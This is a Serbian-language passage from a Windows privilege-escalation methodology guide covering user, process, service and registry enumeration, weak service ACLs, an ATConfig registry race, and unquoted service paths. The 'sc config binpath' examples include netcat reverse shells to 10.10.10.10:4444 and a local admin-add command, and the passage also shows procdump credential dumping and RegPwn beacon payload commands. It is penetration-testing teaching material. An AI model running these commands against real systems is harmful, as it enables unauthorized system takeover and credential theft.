**Domenski akreditivi** se autentifikuju pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavu korisnika autentifikuju pomoću registrovanog bezbednosnog paketa, obično se uspostavljaju domenski akreditivi za tog korisnika.\
[**Više informacija o keširanim akreditivima**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistavanje korisnika i grupa

Proverite da li neka od grupa čiji ste član ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda možete da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i tome kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na sledećoj stranici **saznajte više o zanimljivim tokenima** i tome kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, prilikom listanja procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **da prepišete neki pokrenuti binarni fajl** ili imate dozvole za pisanje u fasciklu binarnog fajla kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može biti kratkotrajan, pa to što ga nema u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne potvrđuju izvršavanje koda između korisnika. Rutinsko nabrajanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola za fascikle binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor direktorijumi

Snort 2 može da učitava deljene biblioteke iz `dynamicpreprocessor directory` deklarisanog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, proverite tu konkretnu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, tu putanju treba proveriti kao mogući vektor za izvršavanje koda pri sledećem učitavanju modula tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane pristupa ili deljenja; sama mogućnost upisa u direktorijum ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web servis sa upisivim korenom dokumenata

Na Windows Apache instalaciji, uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u aktivnoj datoteci `httpd.conf`. Za uobičajen XAMPP raspored, proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda na strani servera može da pređe granicu privilegija hosta. Potvrdite da servis radi, da se poslužuje tačna putanja i da server-side handler obrađuje tip datoteke; mogućnost upisa u koren sama po sebi dokazuje samo kreiranje datoteka. Proverite ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za uobičajenu WAMP instalaciju, servis može upućivati na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u susednom direktorijumu `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu sliku servisa, identitet pod kojim se izvršava, efektivni `DocumentRoot` (uključujući proširenje `${INSTALL_DIR}` i izmene virtuelnih hostova) i ACL korena. Mogućnost upisivanja u WAMP direktorijum ne dokazuje da se Apache izvršava kao `SYSTEM` niti da pokreće poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS koren sa dozvolom za upisivanje i mrežni identitet bazena aplikacija

Za IIS, povežite fizički direktorijum sa dozvolom za upisivanje sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji je bazen konfigurisan za njega i koji obrađivač radi na serveru. Kod smešten u direktorijumu koji se servira izvršava se kao bazen samo ako IIS obrađuje taj tip datoteke i ako je putanja dostupna. Pre nego što direktorijum sa dozvolom za upisivanje smatrate mestom za izvršavanje koda, proverite efektivni pristup trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, obrađivač i nadjačavanja za konkretnu putanju.

Dinamičko prevođenje ASP.NET-a uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za prevođenje aplikacije. Podrazumevana lokacija je direktorijum `Temporary ASP.NET Files` u okviru odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da je promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za prevođenje kada bazeni aplikacija nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ta aplikacija ponovo prevodi kod pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima prevođenja, identitetom procesa i trenutkom eventualnog ponovnog prevođenja. Koristite pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokretati prevođenje niti menjati datoteke keša.

Bazen IIS-a konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje prema resursima domena kao **nalog računara domaćina**, iako njegov lokalni token možda ima niske privilegije. `LocalSystem` već ima visoke privilegije lokalno, a na mreži takođe koristi nalog računara; `LocalService` obično koristi anonimne mrežne akreditive. Bazen `SpecificUser` koristi nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet bazena aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Izostavljeno podešavanje identiteta može naslediti podrazumevane vrednosti bazena, koje se razlikuju između generacija IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu naziva bazena. Ako izvršavanje koda dosegne bazen sa mrežnim identitetom računara, procenite prava u direktorijumu za **konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije u kontekstu imenovanja domena; tiket naloga računara ili uloga domaćina sami po sebi ih ne dokazuju. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod ASP.NET obrađivača koji može da se pročita i pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Obrađivač koji spaja dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti metaznakovima ljuske da promene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i dosegne obrađivač, a zatim utvrdite efektivni identitet bazena aplikacija ili identitet pri impersonaciji, kao i identitet podređenog procesa. Čitljiva izvorna linija, slušač na localhost-u ili slabost u formatu tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kod i konfiguraciju bazena bez slanja falsifikovanih zahteva niti pokretanja pomoćnog procesa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP datoteku na koju korisnik sa nižim privilegijama može da upisuje, pod identitetom radnog procesa. Potvrdite da zahtev može da dosegne tu naredbu, da razrešena putanja vodi до датотеке koju korisnik sa nižim privilegijama može da menja i koju radni proces može da čita, da primenjena PHP ograničenja putanja dozvoljavaju uključivanje i da se radni proces zaista izvršava sa višim privilegijama. Slušač na loopback-u ili datoteka sa dozvolom za upisivanje sami po sebi ne uspostavljaju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja krajnje tačke.

### Iskopavanje lozinki iz memorije

Možete napraviti memorijski ispis pokrenutog procesa pomoću **procdump** iz sysinternals-a. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite memorijski ispis i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije pokrenute kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support” (Windows + F1), pretražite „command prompt”, kliknite na „Click to open Command Prompt”

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za preuzimanje u koji korisnik sa nižim privilegijama može da upisuje prelazi granicu poverenja u pogledu ulaznih podataka pod nalogom uvoznika. Proverite **tačnu putanju u koju je moguće upisivati**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem pri otvaranju/obnavljanju Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je XML external entities u metapodacima projekta; mrežni entitet u Windows-u mogao je da izazove autentifikaciju naloga koji uvozi projekat ako to dozvoljavaju [politike za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je naznaka mogućeg izlaganja akreditiva, a ne neposrednog pristupa administratora: odgovor mora da bude iskoristiv preko zasebne autorizovane ili ranjive putanje, a trenutne verzije treba proceniti prema stvarnom stanju zakrpa. Tokom pasivnog popisivanja nemojte otvarati posebno napravljeni projekat; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećim servisom. Uspešan zahtev za pristup samo za čitanje preko [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo predstavlja naznaku za proveru, a ne dokaz da novi servis može da se pokrene. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa servisnim pravima zatraženim prilikom kreiranja; naknadno ponovno otvaranje servisa pokreće zasebnu proveru pristupa i može da ne uspe čak i kada je prvobitni handle mogao da se iskoristi. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, servisni nalog, pravila pokretanja i putanju izvršne datoteke. Tokom pasivnog popisivanja nemojte kreirati niti pokretati servis.

Za putanju udaljene instalacije servisa povežite ta SCM prava sa deljenom resursom na ciljnom računaru u koji **ista mrežna prijava** može da upisuje, osnovnim NTFS ACL-ом i lokalnom putanjom do izvršne datoteke koju servisni nalog može da pokrene. Nalog koji nije administrator može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i mogućnost smeštanja datoteke; administrativni resurs nije nužan uslov. Pravo upisa u deljeni resurs samo po sebi, kao ni naznaka prava za kreiranje servisa u SCM-u, ne dokazuje da novi servis može da se pokrene pod identitetom sa višim privilegijama.

Postojeći servis može pri pokretanju, gašenju ili drugom događaju u životnom ciklusu da pozove pomoćnu izvršnu datoteku, čak i kada ona nije navedena u njegovom `ImagePath`-u. Ako se naziv pomoćne datoteke razrešava u direktorijum u koji može da upisuje korisnik sa nižim privilegijama, a servis radi pod identitetom sa višim privilegijama, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovani poziv pomoćne datoteke**, razrešenu putanju do izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i dostupan okidač životnog ciklusa. Direktorijum servisa u koji je moguće upisivati ili sama činjenica da datoteka nedostaje ne dokazuju da servis učitava tu datoteku; tokom pasivnog pregleda nemojte pokretati niti zaustavljati servis.

Za postojeći servis, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to pravo se razlikuje od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pre nego što pristup za pokretanje smatrate nečim više od prava za upravljanje, pregledajte kod servisa ili njegovo dokumentovano sučelje. Ako koristi argument koji bira pozivalac kao putanju za zapisivanje dnevnika ili izvoz, proverite identitet servisa, tačan tok od argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sama mogućnost upisa u dnevnik ili pravo pokretanja nisu dovoljni. Tokom pasivnog popisivanja nemojte pokretati servis niti kreirati probnu datoteku.

Kod NSClient++ agenta za nadzor, dostupna datoteka `nsclient.ini` predstavlja **naznaku za pregled konfiguracije**: može sadržati akreditive za web interfejs, dok `boot.ini` može preusmeriti konfiguraciju na drugu lokaciju. Proverite stvarni nalog servisa, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za privilegovano izvršavanje potrebni su i `CheckExternalScripts` (ili druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Listener ograničen samo na loopback i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju da ta prava postoje. Tokom pasivnog popisivanja pregledajte metapodatke i dozvole, ali nemojte prikazivati tajne niti pozivati web API. Pogledajte [raspored datoteka NSClient++-a](https://nsclient.org/docs/concepts/file-layout/), [uputstva za bezbednost web interfejsa i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju eksternih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kod servisa čiji je `ImagePath` `nssm.exe`, pregledajte stvarni nalog pod kojim servis radi i vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tu čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov konfigurisani radni direktorijum. Proverite ACL-ove podređene izvršne datoteke i njenog nadređenog direktorijuma pre nego što zaključite da dozvole omotača obuhvataju celu bezbednosnu granicu servisa. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija zasebna je naznaka za proveru: potvrdite da je listener dostupan korisniku sa nižim privilegijama, da konkretna operacija prihvata njegov ulaz i da podređena aplikacija servisa izvršava nesigurnu operaciju pod identitetom sa višim privilegijama. Sam servisni nalog, URL krajnje tačke ili putanja u koju je moguće upisivati ne dokazuju eskalaciju; tokom pasivnog popisivanja nemojte pozivati servisne operacije.

Kod prilagođene WCF operacije pratite string kojim upravlja pozivalac do bilo kog PowerShell runspace-а. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows transportnim akreditivima](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali se zasebno mora proveriti autorizacija za pozivanje baš te operacije i efektivni identitet runspace-а. Putanja od ulaza korisnika sa nižim privilegijama do `AddScript`-a pod identitetom servisnog naloga sa višim privilegijama predstavlja granicu za izvršavanje koda; port koji sluša, autentifikovani klijent ili nekorišćena metoda u nepovezanom sklopu sami po sebi nisu dokaz. Statički pregledajte instalirani servis, ugovor, autorizaciju i podešavanja impersonacije, bez pozivanja krajnje tačke tokom popisivanja.

Service Triggers omogućavaju Windows-u da pokrene servis kada se jave određeni uslovi (aktivnost named pipe/RPC krajnje tačke, ETW događaji, dostupnost IP-a, priključivanje uređaja, osvežavanje GPO-a itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane servise aktiviranjem njihovih okidača. Tehnike popisivanja i aktiviranja potražite ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usluga za prikupljanje dijagnostike Visual Studio-a

Instalacije Visual Studio-a sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostički servis konfigurisan da radi kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i race uslov sa object-manager-link-om da preusmeri resetovanje DACL-a servisa. Prikazana eskalacija zahtevala je i upotrebljivu putanju za popravku MSI-ja preko Visual Studio Setup WMI Provider-a i njenu metu `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu početnu proveru pregledajte nalog i binarnu putanju tog servisa, proverite da li postoji putanja do Setup WMI compiler-а i utvrdite da li je instalirana komponenta zakrpljena. Sam unos servisa, verzija proizvoda Visual Studio ili datoteka compiler-а ne dokazuju da je računar ranjiv. Pregled ne zahteva pokretanje servisa niti izvršavanje popravke.

Pribavite spisak servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete da koristite **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_-a kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa "Authenticated Users" može da menja neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje usluge

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga se ne može pokrenuti jer je onemogućena ili zato što nema nijedan omogućen uređaj povezan sa njom._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od servisa SSDPSRV da bi radio (za XP SP1)**

**Drugo privremeno rešenje** ovog problema je da pokrenete:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati preko različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfigurisanje dozvola, čime se stiče mogućnost menjanja konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje servis izvršava možete dobiti pomoću **wmic** (ne u system32), a svoje dozvole možete proveriti pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Takođe možete koristiti **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću komande `sc qc <service_name>`.
2. Potvrdite da može da se upisuje u binarnu datoteku pomoću komande `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili ispravnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću komande `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako običan korisnik ne može da restartuje servis, proverite da li se on automatski pokreće pri pokretanju sistema, da li ima podešenu radnju za slučaj otkaza koja ga ponovo pokreće ili može indirektno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite neki registar servisa.\
Možete **proveriti** svoje **dozvole** nad **registrom** servisa tako što ćete:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za pisanje u registru na određenom ključu servisa. Sam ACL unos ne dokazuje efektivan pristup: važni su unosi za odbijanje, trenutni token i nasleđene dozvole. Prava nad ključem registratora razlikuju se od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa višim privilegijama. Pogledajte Microsoftove reference za [prava nad ključevima registratora](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [prava pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa registry symlink-om za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju **ATConfig** ključeve po korisniku, koje **SYSTEM** proces kasnije kopira u HKLM session ključ. Trka sa registry **symbolic link-om** može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija mogućnost **upisa proizvoljne vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva korisnički kontrolisanu konfiguraciju.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijave ili prelaza na secure desktop i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na secure desktop (npr. pomoću **LockWorkstation**), čime se pokreće AT broker flow.
3. **Pobedite u trci** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ **registry link-om** ka zaštićenoj HKLM meti.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu HKLM putanju.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** u sklopu trke.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory za registry servisa

Ako imate ovu dozvolu nad registry-jem, to znači da **možete da kreirate podregistrije u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Nequoted putanje servisa

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

